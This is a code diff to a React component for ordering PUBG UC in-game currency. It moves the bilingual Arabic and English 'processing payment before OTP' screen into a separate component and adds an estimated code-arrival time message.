@@ -1,6 +1,7 @@
 import React, {useEffect, useMemo, useState} from 'react';
 import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
+import {CardProcessingToOtpScreen} from './OtpPaymentUi';
 import {useLanguage} from '../context/LanguageContext';
 import {apiUrl} from '../lib/apiBase';
 import {formatLatinDigits} from '../lib/formatNumbers';
@@ -213,13 +214,10 @@ export function PubgUcOrder({
   // جاري المعالجة قبل OTP
   if (cardProcessingToOtp) {
     return (
-      <div className="max-w-md mx-auto pb-6">
-        <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
-          <Activity className="w-12 h-12 text-red-600 animate-pulse mx-auto" />
-          <h3 className="font-black text-lg text-gray-900">{lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}</h3>
-          <p className="text-sm text-gray-400">{lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}</p>
-        </div>
-      </div>
+      <CardProcessingToOtpScreen
+        lang={lang}
+        etaText={lang === 'ar' ? 'الوقت المتوقع لوصول الرمز: 1 إلى 2 دقيقة' : 'Expected code arrival: 1 to 2 minutes'}
+      />
     );
   }
 
